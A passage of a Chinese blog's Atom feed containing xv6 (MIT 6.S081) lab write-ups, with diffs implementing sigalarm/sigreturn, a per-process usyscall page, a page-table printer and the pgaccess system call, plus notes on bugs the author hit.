inserted">+</span><span class="token line">  memmove(&amp;(p->strapframe), p->trapframe, sizeof(p->strapframe));</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  p->ticksum = -1; // prevent re-entrant calls to the handler</span><span class="token prefix inserted">+</span><span class="token line">  p->trapframe->epc = (uint64)p->handler;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    yield();</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  usertrapret();</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/user/user.h b/user/user.hindex b71ecda..422a4c1 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span>@@ -23,6 +23,8 @@ int getpid(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int sigalarm(int ticks, void (*handler)()); // here</span><span class="token prefix inserted">+</span><span class="token line">int sigreturn(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 01e426e..84c6784 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,3 +36,5 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("sigalarm"); # here</span><span class="token prefix inserted">+</span><span class="token line">entry("sigreturn");</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;使用gdb调试xv6内核&quot;&gt;&lt;a href=&quot;#使用gdb调试xv6内核&quot; class=&quot;headerlink&quot; title=&quot;使用gdb调试xv6内核&quot;&gt;&lt;/a&gt;使用gdb调试xv6内核&lt;/h1&gt;&lt;p&gt;从最近两个 Lab 开始，代码逻辑的复杂度明显上升，对内核进</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Page tables</title>
    <link href="http://lordaeronesz.github.io/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/"/>
    <id>http://lordaeronesz.github.io/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/</id>
    <published>2024-07-01T03:45:11.000Z</published>
    <updated>2024-07-07T08:04:58.125Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Speed-up-system-calls"><a href="#Speed-up-system-calls" class="headerlink" title="Speed up system calls"></a>Speed up system calls</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目要求在每个进程初始化时为它的页表插入一个页表项，内核通过这样预先缓存页表项的操作，来加速特定系统调用的执行速度。</p><p>由于前不久刚过完一遍《OSTEP》，因此我认为自己对页表机制还算比较熟悉，应对本 Lab 理应比较轻松，但在真正上手的时候，还是觉得有些无所适从，无奈老老实实地把 xv6 手册的第 3 章对照着代码仔细研读了一番，从中提炼出了几个关键的函数：</p><ol><li><code>kernel/kalloc.c:kalloc</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>遍历空闲链表，寻找一个可分配的物理页面。若找到，返回该页面的首（物理）地址；否则，返回 0 （空指针）。</p><ol><li><code>kernel/kalloc.c:kfree</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">kfree</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>pa<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>释放已分配的首地址为 <code>pa</code> 的物理页面，并更新空闲链表。</p><ol><li><code>kernel/proc.c:allocproc</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span><span class="token function">allocproc</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>遍历进程数组 <code>proc</code>，寻找未被使用的 <code>struct proc</code>。若找到，则初始化其状态，为创建一个新的<strong>页表</strong>，并返回指向它的指针；否则，返回 0（空指针）。</p><ol><li><code>kernel/proc.c:freeproc</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">freeproc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>释放与进程 <code>p</code> 相关的数据的内存空间，并清空 <code>p</code> 的 <code>struct proc</code> 的所有信息。</p><ol><li><code>kernel/vm.c:mappages</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">mappages</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">,</span> uint64 size<span class="token punctuation">,</span> uint64 pa<span class="token punctuation">,</span> <span class="token keyword">int</span> perm<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在页表 <code>pagetrable</code> 中创建从起始虚拟地址 <code>va</code> 到起始物理地址 <code>pa</code> 的页表项映射，页表项的 <code>flags</code> 位的访问权限部分设置为 <code>perm</code>，其中大小为 <code>size</code>，将 <code>size</code> 分为若干页，为这些页面创建 <code>va + i * PGSIZE -&gt; pa + i * PGSIZE</code> （<code>i</code> 代表页面的编号）的映射。</p><ol><li><code>kernel/vm.c:uvmunmap</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">uvmunmap</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">,</span> uint64 npages<span class="token punctuation">,</span> <span class="token keyword">int</span> do_free<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>从 <code>pagetable</code> 中移除从虚拟地址 <code>va</code> 开始的 <code>npages</code> 个页表项。可指定 <code>do_free</code> 的值，若不为 0，则在移除页表项的同时，释放页表项映射 <code>va -&gt; pa</code> 中 <code>pa</code> 指向的内存空间。 </p><p>分析完几个关键函数之后，思路就比较清晰了：</p><ol><li>为 <code>struct proc</code> 结构体添加 <code>struct usyscall *usc</code> 段。</li><li>在 <code>allocproc()</code> 中为 <code>usc</code> 分配物理内存，并对其赋值：<code>p-&gt;usc-&gt;pid = p-&gt;pid;</code>。</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">-></span>usc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">usyscall</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">freeproc</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token operator">-></span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>p<span class="token operator">-></span>usc<span class="token operator">-></span>pid <span class="token operator">=</span> p<span class="token operator">-></span>pid<span class="token punctuation">;</span></code></pre><ol><li>在 <code>freeproc()</code> 中释放 <code>usc</code> 的物理内存。</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span><span class="token function">kfree</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">-></span>usc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></code></pre><ol><li>在 <code>proc_pagetable()</code> 中使用 <code>mappages</code> 插入虚拟地址 <code>USYSCALL</code> 的页表项。</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mappages</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> USYSCALL<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span><span class="token punctuation">,</span> PTE_R <span class="token operator">|</span> PTE_U<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> TRAMPOLINE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> TRAPFRAME<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">uvmfree</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ol><li>最后，非常容易忽视的，在 <code>proc_freepagetable()</code> 中删除虚拟地址 <code>USYSCALL</code> 的页表项。</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> USYSCALL<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>接下来讲讲我在本题遇到的几个问题。</p><p><strong>问题 1：</strong></p><p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/pn1.png" alt></p><p><strong>原因：</strong> <code>p-&gt;usc-&gt;pid = p-&gt;pid</code> 放在分配物理内存之前，导致空指针解引用。</p><p><strong>问题 2：</strong></p><p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/pn2.png" alt></p><p><strong>原因：</strong> 未在 <code>proc_freepagetable()</code> 中解除 <code>USYSCALL</code> 的页表项映射，也就是上面提到的容易忽视的第 5 点。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..5fc573f 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -127,6 +127,14 @@ found:<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    return 0;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  if ((p->usc = (struct usyscall *)kalloc()) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">freeproc(p);</span><span class="token prefix inserted">+</span><span class="token line">release(&amp;p->lock);</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  p->usc->pid = p->pid;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  // An empty user page table.</span><span class="token prefix unchanged"> </span><span class="token line">  p->pagetable = proc_pagetable(p);</span><span class="token prefix unchanged"> </span><span class="token line">  if(p->pagetable == 0)&#123;</span></span>@@ -153,6 +161,9 @@ freeproc(struct proc *p)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(p->trapframe)</span><span class="token prefix unchanged"> </span><span class="token line">    kfree((void*)p->trapframe);</span><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe = 0;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if (p->usc) // here</span><span class="token prefix inserted">+</span><span class="token line">kfree((void*)p->usc);</span><span class="token prefix inserted">+</span><span class="token line">  p->usc = 0;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(p->pagetable)</span><span class="token prefix unchanged"> </span><span class="token line">    proc_freepagetable(p->pagetable, p->sz);</span><span class="token prefix unchanged"> </span><span class="token line">  p->pagetable = 0;</span></span>@@ -195,6 +206,14 @@ proc_pagetable(struct proc *p)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    uvmfree(pagetable, 0);</span><span class="token prefix unchanged"> </span><span class="token line">    return 0;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  if (mappages(pagetable, USYSCALL, PGSIZE, (uint64)(p->usc), PTE_R | PTE_U) &lt; 0) &#123;  </span><span class="token prefix inserted">+</span><span class="token line">uvmunmap(pagetable, TRAMPOLINE, 1, 0);</span><span class="token prefix inserted">+</span><span class="token line">uvmunmap(pagetable, TRAPFRAME, 1, 0);</span><span class="token prefix inserted">+</span><span class="token line">uvmfree(pagetable, 0);</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  return pagetable;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -206,6 +225,7 @@ proc_freepagetable(pagetable_t pagetable, uint64 sz)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#123;</span><span class="token prefix unchanged"> </span><span class="token line">  uvmunmap(pagetable, TRAMPOLINE, 1, 0);</span><span class="token prefix unchanged"> </span><span class="token line">  uvmunmap(pagetable, TRAPFRAME, 1, 0);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uvmunmap(pagetable, USYSCALL, 1, 0); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  uvmfree(pagetable, sz);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..d25a729 100644<span class="token coord">--- a/kernel/proc.h</span><span class="token coord">+++ b/kernel/proc.h</span>@@ -82,6 +82,8 @@ struct trapframe &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">enum procstate &#123; UNUSED, USED, SLEEPING, RUNNABLE, RUNNING, ZOMBIE &#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">struct usyscall;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">// Per-process state</span><span class="token prefix unchanged"> </span><span class="token line">struct proc &#123;</span><span class="token prefix unchanged"> </span><span class="token line">  struct spinlock lock;</span></span>@@ -105,4 +107,7 @@ struct proc &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  struct usyscall *usc;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span></code></pre><h1 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>仿照 <code>freewalk</code> 函数的写法，递归查找所有有效的页表项，并根据题干要求打印相关信息。涉及的内容较少，如果认真把上面提到的几个关键函数理清楚，并且理解了多级页表的机制，写起来还是比较轻松的，流程如下：</p><p>遍历当前页表中的所有页表项，如果页表项有效（flags 的有效位为 1），则将该页表项转换为物理地址向下递归搜索。需要注意的是在递归查找到第 3 级页表时，就不能继续向下递归了，此时得到的 <code>pa</code> 就是进行虚实地址转换后的物理地址。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..d169300 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -170,6 +170,7 @@ uint64          walkaddr(pagetable_t, uint64);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyout(pagetable_t, uint64, char *, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">void            vmprint(pagetable_t); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// plic.c</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);</span></span>diff --git a/kernel/exec.c b/kernel/exec.cindex d62d29d..89f3d74 100644<span class="token coord">--- a/kernel/exec.c</span><span class="token coord">+++ b/kernel/exec.c</span>@@ -115,6 +115,11 @@ exec(char *path, char **argv)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe->epc = elf.entry;  // initial program counter = main</span><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe->sp = sp; // initial stack pointer</span><span class="token prefix unchanged"> </span><span class="token line">  proc_freepagetable(oldpagetable, oldsz);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  if(p->pid == 1) &#123;</span><span class="token prefix inserted">+</span><span class="token line">vmprint(p->pagetable);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  return argc; // this ends up in a0, the first argument to main(argc, argv)</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/vm.c b/kernel/vm.cindex d5a12a0..23eeec9 100644<span class="token coord">--- a/kernel/vm.c</span><span class="token coord">+++ b/kernel/vm.c</span>@@ -432,3 +432,25 @@ copyinstr(pagetable_t pagetable, char *dst, uint64 srcva, uint64 max)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    return -1;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">void vmprint_recur(pagetable_t pagetable, int depth) &#123;</span><span class="token prefix inserted">+</span><span class="token line">for (int i = 0; i &lt; 512; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">pte_t pte = pagetable[i];</span><span class="token prefix inserted">+</span><span class="token line">if (pte &amp; PTE_V) &#123; // pte is valid</span><span class="token prefix inserted">+</span><span class="token line">for (int j = 0; j &lt; depth; ++j) &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf(" ..");</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">uint64 child = PTE2PA(pte);</span><span class="token prefix inserted">+</span><span class="token line">printf("%d: pte %p pa %p\n", i, pte, child);</span><span class="token prefix inserted">+</span><span class="token line">if (depth &lt; 3) &#123;</span><span class="token prefix inserted">+</span><span class="token line">vmprint_recur((pagetable_t)child, depth + 1);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">void vmprint(pagetable_t pagetable) &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf("page table %p\n", pagetable);</span><span class="token prefix inserted">+</span><span class="token line">vmprint_recur(pagetable, 1);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span></code></pre><h1 id="Detecting-which-pages-have-been-accessed"><a href="#Detecting-which-pages-have-been-accessed" class="headerlink" title="Detecting which pages have been accessed"></a>Detecting which pages have been accessed</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>题目要求实现一个系统调用 <code>sys_pgaccess()</code>，获取指定虚拟页面的<strong>最近被访问信息</strong>。</p><p>算是一个大杂烩的题，把 Lab System calls 的内容和 pagetable 结合起来，不要被 hard 难度标签吓到了，只要前面的 Lab 全都认真完成，再运用一些位运算的技巧，本题其实并不 “hard”。</p><p>所有的系统调用需要的声明已经实现添加好了，我们只需要关注 <code>sys_pgaccess()</code> 的实现即可，基本流程如下：</p><ol><li>和 Lab System calls 一样，使用 <code>argint()</code> 和 <code>argaddr()</code> 获取用户空间传递的参数：<code>base</code>、<code>len</code>、<code>mask</code>。</li><li>函数体内定义一个 <code>kmask</code>，作为 <code>mask</code> 的缓冲区。</li><li>从地址 <code>base</code> 开始遍历连续的 <code>len</code> 的页面，获取该页面的页表项 <code>pte</code>，根据 <code>pte</code> 的访问位对 <code>kmask</code> 进行置位，注意不要忘了每次遍历后将 <code>pte</code> 的访问位置 0。</li><li>遍历完成后，使用 <code>copyout()</code> 将 <code>kmask</code> 的数据存入用户空间 <code>mask</code> 处。</li></ol><p>有一个值得注意的问题，根据提示：</p><blockquote><p>It’s okay to set an upper limit on the number of pages that can be scanned.</p></blockquote><p>可以设定一个最大扫描范围，这主要根据 <code>kmask</code> 的数据类型而定，这里我选择使用 <code>long</code> 类型，那么最大扫描范围自然就是 64（<code>long</code> 类型为 8 字节大小，64 bit）。</p><p>同时，在对 <code>kmask</code> 操作时，可以运用一些位运算的技巧：</p><p>首先可以将 <code>kmask</code> 置为 0（二进制位全为 0），如果页面 i 的访问位为 1，则使用 <code>kmask |= (1 &lt;&lt; i)</code>，将 <code>kmask</code> 第 i 位置为 1 而不影响其它位（<code>0 | 0 = 0; 1 | 0 = 1</code>）。</p><p>要清除 <code>pte</code> 的访问位，可使用 <code>*pte &amp;= ~PTE_A</code>，其中 <code>PTE_A = 1L &lt;&lt; 6</code>，即访问位为 1，其它位都为 0，取反后，访问位为 0，其它位都为 1，与其进行按位与运算可将访问位置为 0，而不影响其它位（<code>0 &amp; 1 = 0; 1 &amp; 1 = 1</code>）。</p><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p><strong>问题 1：</strong></p><p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/walk.png" alt></p><p><strong>原因：</strong> 比较坑的一个问题，原因是 <code>kernel/defs.h</code> 中没有 <code>walk</code> 函数声明，需要手动添加。</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.hindex d169300..53f1f88 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -171,6 +171,7 @@ int             copyout(pagetable_t, uint64, char *, uint64);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">void            vmprint(pagetable_t); // here</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pte_t *walk(pagetable_t, uint64, int);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// plic.c</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);</span></span>diff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..6b130fe 100644<span class="token coord">--- a/kernel/riscv.h</span><span class="token coord">+++ b/kernel/riscv.h</span>@@ -343,6 +343,7 @@ sfence_vma()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define PTE_W (1L &lt;&lt; 2)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_X (1L &lt;&lt; 3)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_U (1L &lt;&lt; 4) // 1 -> user can access</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PTE_A (1L &lt;&lt; 6) // access bit</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// shift a physical address to the right place for a PTE.</span><span class="token prefix unchanged"> </span><span class="token line">#define PA2PTE(pa) ((((uint64)pa) >> 12) &lt;&lt; 10)</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.cindex 3bd0007..359847c 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -81,6 +81,36 @@ int<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">sys_pgaccess(void)</span><span class="token prefix unchanged"> </span><span class="token line">&#123;</span><span class="token prefix unchanged"> </span><span class="token line">  // lab pgtbl: your code here.</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line">  void *base, *mask;</span><span class="token prefix inserted">+</span><span class="token line">  long kmask; // buffer</span><span class="token prefix inserted">+</span><span class="token line">  int len;</span><span class="token prefix inserted">+</span><span class="token line">  pte_t *pte;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  if (argaddr(0, (uint64 *)&amp;base) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  if (argint(1, &amp;len) &lt; 0 || len > 64) &#123; // page limited to 64</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  if (argaddr(2, (uint64 *)&amp;mask) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  kmask = 0L; // initialize bitmask to zero</span><span class="token prefix inserted">+</span><span class="token line">  for (int i = 0; i &lt; len; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">uint64 va = (uint64)(base + i * PGSIZE);</span><span class="token prefix inserted">+</span><span class="token line">pte = walk(p->pagetable, va, 0);</span><span class="token prefix inserted">+</span><span class="token line">if (*pte &amp; PTE_A) &#123; // pte was accessed recently</span><span class="token prefix inserted">+</span><span class="token line">  kmask |= (1 &lt;&lt; i);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">*pte &amp;= ~PTE_A; // clear access bit</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  if (copyout(p->pagetable, (uint64)mask, (char *)&amp;kmask, 8) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token 